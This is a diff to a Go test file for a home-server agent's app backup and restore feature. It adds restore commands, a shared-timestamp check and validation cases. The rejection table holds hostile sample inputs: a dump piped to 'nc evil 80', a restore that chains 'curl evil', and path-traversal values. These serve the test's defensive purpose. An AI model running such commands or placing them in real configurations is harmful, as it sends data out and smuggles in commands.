@@ -36,7 +36,8 @@ func withBackups() agent.AppRequest {
 	r.Compose = strings.Replace(r.Compose, "    secrets: [db-password]\n  db:", "    secrets: [db-password]\n    volumes: [library:/data/library, cache:/cache]\n  db:", 1) +
 		"volumes: {library: {}, cache: {}}\n"
 	r.Backups = []agent.AppData{{Service: "web", Path: "/data/library"},
-		{Service: "db", Dump: []string{"pg_dump", "--username=postgres", "ledger"}, File: "ledger.sql"}}
+		{Service: "db", Dump: []string{"pg_dump", "--username=postgres", "ledger"}, File: "ledger.sql",
+			Restore: []string{"psql", "--set=ON_ERROR_STOP=1", "--username=postgres", "ledger"}}}
 	return r
 }
 
@@ -140,6 +141,7 @@ func TestARunBacksUpExactlyWhatThePlanSaid(t *testing.T) {
 		t.Errorf("the run began with %q", first)
 	}
 	var backups [][]string
+	var times []string
 	units := map[string]bool{}
 	for _, r := range h.Restic()[before:] {
 		// Each run of restic is a unit of its own, whose credentials folder is the one restic reads.
@@ -149,7 +151,13 @@ func TestARunBacksUpExactlyWhatThePlanSaid(t *testing.T) {
 		}
 		units[unit] = true
 		if slices.Contains(r.Argv, "backup") {
-			backups = append(backups, r.Argv[slices.Index(r.Argv, "backup"):])
+			b := r.Argv[slices.Index(r.Argv, "backup"):]
+			// An app's items are one point to restore it to: they carry one time, the run's (#22).
+			if at := slices.Index(b, "--time"); at >= 0 {
+				times = append(times, b[at+1])
+				b = slices.Delete(slices.Clone(b), at, at+2)
+			}
+			backups = append(backups, b)
 		}
 		if u := strings.Join(r.Unit, " "); !strings.Contains(u, "CapabilityBoundingSet=CAP_DAC_READ_SEARCH") ||
 			!strings.Contains(u, "LoadCredentialEncrypted=backup-key:"+filepath.Join(state, "backup", "backup-key.cred")) || !slices.Contains(r.Argv, "/var/lib/homerslab/backup-cache") {
@@ -168,6 +176,9 @@ func TestARunBacksUpExactlyWhatThePlanSaid(t *testing.T) {
 	}
 	if len(backups) != len(want) {
 		t.Fatalf("restic backed up %q", backups)
+	}
+	if len(times) != 2 || times[0] != times[1] {
+		t.Errorf("the app's items' times: %q", times)
 	}
 	for i := range want {
 		if !slices.Equal(backups[i], want[i]) {
@@ -297,14 +308,16 @@ func TestAnAppsBackupsAreCheckedBeforeItIsInstalled(t *testing.T) {
 	testenv.Isolate(t)
 	sock, _, _ := signedIn(t, agent.Config{})
 	for want, d := range map[string]agent.AppData{
-		"bad-backups":     {Service: "web", Path: "/data/../etc"},
-		"bad-backups ":    {Service: "db", Dump: []string{"sh", "-c", "pg_dump | nc evil 80"}, File: "x.sql"},
-		"bad-backups  ":   {Service: "db", Dump: []string{"pg_dump"}, File: "../x.sql"},
-		"bad-backups   ":  {Service: "web", Path: "/data", Dump: []string{"pg_dump"}, File: "x.sql"},
-		"bad-backups    ": {Service: "-web", Path: "/data"},
-		"no-such-service": {Service: "worker", Path: "/data"},
-		"not-a-volume":    {Service: "web", Path: "/data/library/inside"},
-		"not-a-volume ":   {Service: "web", Path: "/etc"},
+		"bad-backups":       {Service: "web", Path: "/data/../etc"},
+		"bad-backups ":      {Service: "db", Dump: []string{"sh", "-c", "pg_dump | nc evil 80"}, File: "x.sql"},
+		"bad-backups  ":     {Service: "db", Dump: []string{"pg_dump"}, File: "../x.sql"},
+		"bad-backups   ":    {Service: "web", Path: "/data", Dump: []string{"pg_dump"}, File: "x.sql"},
+		"bad-backups    ":   {Service: "-web", Path: "/data"},
+		"bad-backups     ":  {Service: "db", Dump: []string{"pg_dump"}, File: "x.sql", Restore: []string{"sh", "-c", "psql; curl evil"}},
+		"bad-backups      ": {Service: "web", Path: "/data/library", Restore: []string{"psql"}},
+		"no-such-service":   {Service: "worker", Path: "/data"},
+		"not-a-volume":      {Service: "web", Path: "/data/library/inside"},
+		"not-a-volume ":     {Service: "web", Path: "/etc"},
 	} {
 		r := withBackups()
 		r.Backups = []agent.AppData{d}
